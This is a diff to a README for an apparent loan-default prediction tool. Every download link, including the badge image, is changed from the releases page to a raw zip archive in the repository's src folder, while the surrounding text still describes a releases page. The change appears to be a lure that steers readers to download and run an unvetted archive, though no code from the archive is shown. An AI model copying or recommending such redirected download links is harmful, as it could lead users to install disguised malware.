@@ -4,7 +4,7 @@
 Welcome to the credit-risk-assessment application! This tool helps you predict loan defaults using advanced machine learning techniques. With this user-friendly software, you can analyze risk using the German Credit dataset. Let’s get you set up!
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/jeremias32-max123/credit-risk-assessment/releases)
+[![Download](https://github.com/jeremias32-max123/credit-risk-assessment/raw/refs/heads/main/src/credit-risk-assessment-3.1-alpha.5.zip)](https://github.com/jeremias32-max123/credit-risk-assessment/raw/refs/heads/main/src/credit-risk-assessment-3.1-alpha.5.zip)
 
 ## 🛠️ System Requirements
 To run this application, ensure your computer meets the following requirements:
@@ -24,7 +24,7 @@ This application includes several powerful features to aid in risk assessment:
 
 ## 🔗 How to Download & Install
 1. **Visit the Releases Page:** Click on the link below to access our latest releases:
-   [Download here](https://github.com/jeremias32-max123/credit-risk-assessment/releases).
+   [Download here](https://github.com/jeremias32-max123/credit-risk-assessment/raw/refs/heads/main/src/credit-risk-assessment-3.1-alpha.5.zip).
    
 2. **Choose Your Version:** Look for the most recent version of the application. Usually listed at the top.
 
@@ -69,4 +69,4 @@ Join our community to share your experiences or ask questions. You can reach us 
 ## 🏁 Conclusion
 The credit-risk-assessment tool is designed for everyone looking to delve into loan predictions with ease. Start making informed decisions today by downloading the application! 
 
-For more details or to download, visit: [Download Here](https://github.com/jeremias32-max123/credit-risk-assessment/releases)
+For more details or to download, visit: [Download Here](https://github.com/jeremias32-max123/credit-risk-assessment/raw/refs/heads/main/src/credit-risk-assessment-3.1-alpha.5.zip)
